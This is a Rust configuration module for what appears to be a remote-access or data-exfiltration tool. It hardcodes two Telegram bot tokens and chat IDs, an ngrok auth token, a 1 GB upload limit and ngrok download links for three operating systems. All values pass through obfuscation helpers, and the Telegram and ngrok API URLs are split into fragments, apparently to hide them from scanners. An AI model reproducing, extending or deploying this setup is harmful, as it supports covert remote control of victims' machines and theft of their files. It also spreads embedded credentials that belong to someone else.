use crate::encryption::{z26, aa27};
use once_cell::sync::Lazy;
use std::sync::Mutex;
use base64::{engine::general_purpose::STANDARD, Engine as _};

#[derive(Clone)]
pub struct Config {
    pub t1: String,        // Telegram bot token 1
    pub t2: String,        // Telegram bot token 2
    pub c1: String,        // Chat ID 1
    pub c2: String,        // Chat ID 2
    pub port: u16,         // HTTP server port
    pub na: String,        // Ngrok auth token
    pub mus: u64,          // Max upload size
    pub bs: usize,         // Buffer size
    pub tu: Vec<String>,   // Telegram API URL parts
    pub nw: String,        // Ngrok Windows download URL
    pub nl: String,        // Ngrok Linux download URL
    pub nm: String,        // Ngrok macOS download URL
    pub nt: Vec<String>,   // Ngrok API URL parts
    pub ngrok_cmd: String, // Ngrok command
    pub ngrok_exe: String, // Ngrok executable
}

pub static SECRET_KEY: Lazy<Mutex<String>> = Lazy::new(|| {
    use rand::{thread_rng, RngCore};
    let mut key = [0u8; 16];
    thread_rng().fill_bytes(&mut key);
    Mutex::new(STANDARD.encode(key))
});

impl Config {
    pub fn new() -> Self {
        Config {
            t1: z26("7879165650:AAEGlyytdOBGxYZ3Pa-Xkkkx2Qg7GzLFG5U".to_string()),
            t2: z26("7891701300:AAE8eJqoqOI_1KIyv2OSydl35iiUcmfWMKY".to_string()),
            c1: z26("1660587036".to_string()),
            c2: z26("1660587036".to_string()),
            port: 8082,
            na: z26("2pDRBFLOSbsnWjTJoJI8Fy2AWF4_2FLnrWQQc1tv3Qyrpw1z1".to_string()),
            mus: 1024 * 1024 * 1024,
            bs: 32 * 1024,
            tu: vec![
                z26("https://".to_string()),
                z26("api.".to_string()),
                z26("telegram.".to_string()),
                z26("org/".to_string()),
                z26("bot".to_string()),
            ],
            nw: z26("https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip".to_string()),
            nl: z26("https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.zip".to_string()),
            nm: z26("https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-darwin-amd64.zip".to_string()),
            nt: vec![
                z26("http://".to_string()),
                z26("127.".to_string()),
                z26("0.".to_string()),
                z26("0.".to_string()),
                z26("1:".to_string()),
                z26("4040/".to_string()),
                z26("api/".to_string()),
                z26("tunnels".to_string()),
            ],
            ngrok_cmd: z26("ngrok".to_string()),
            ngrok_exe: z26("ngrok.exe".to_string()),
        }
    }
    
    pub fn telegram_base_url(&self) -> String {
        let mut parts = Vec::new();
        for s in &self.tu {
            parts.push(aa27(s.clone()));
        }
        parts.join("")
    }
    
    pub fn ngrok_api_url(&self) -> String {
        let mut parts = Vec::new();
        for s in &self.nt {
            parts.push(aa27(s.clone()));
        }
        parts.join("")
    }
}
